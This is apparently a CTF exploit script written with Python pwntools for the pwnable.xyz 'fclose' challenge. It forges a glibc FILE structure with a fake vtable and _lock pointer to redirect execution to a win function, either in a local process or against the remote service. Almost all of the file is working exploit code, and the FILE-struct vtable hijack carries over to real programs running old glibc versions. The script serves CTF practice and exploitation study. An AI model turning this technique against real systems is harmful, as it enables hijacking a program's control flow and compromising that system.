#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
'''
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="debug",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/ctf/ctfs/train/pwnable.xyz/fclose/image/challenge/challenge")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def craft_file(fake_vtable_addr, rip):
    # Craft file struct
    file = FileStructure(null=0xdeadbeef)
    file.flags = 0x0
    file._lock =fake_vtable_addr
    file._old_offset = 0x0
    file._IO_buf_base = 0
    file._wide_data= 0x0
    file._IO_buf_end = 0
    file.vtable = rip

    # file_struct = pack_file(_IO_buf_base = 0,
    #                         _IO_buf_end = (rdi-100)/2,
    #                         _IO_write_ptr = (rdi-100)/2,
    #                         _IO_write_base = 0,
    #                         _lock = bin.symbols['fake_file'] + 0x80)
    # # vtable pointer
    # file_struct += p64(fake_vtable_addr)
    # # (*((_IO_strfile *) fp)->_s._allocate_buffer)
    # file_struct += p64(rip)
    # file_struct = file_struct.ljust(0x100, "\x00")
    return bytes(file)

def exploit(r):
    attach(r)  
    win = 0x4007ec
    inputan = 0x601260
    p = craft_file( inputan + 0x20, inputan + 0x10 - 0xe0)
    print (p)
    r.sendline(p + p64(win))
    r.interactive()

    
    # writeup
    p = process("./challenge", env={"LD_PRELOAD" : "./libc-2.23.so"})
    e = ELF("./challenge")
    # p = remote('svc.pwnable.xyz', 30018)
    payload = p64(0) * 17
    payload += p64(e.symbols["input"] + 0x20)   # _lock
    payload += p64(0) * 9
    payload += p64(e.symbols["input"] - 0x10 + 0xe0)      # fake vtable
    payload += p64(e.symbols["win"])
    
    # gdb.attach(p)
    p.sendlineafter("> ", payload)
    
    p.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("svc.pwnable.xyz", 30018)
    else:
        LOCAL = True
        r = process("./challenge", env={"LD_PRELOAD" : "./libc-2.23.so"})
    exploit(r)
    sys.exit(0)
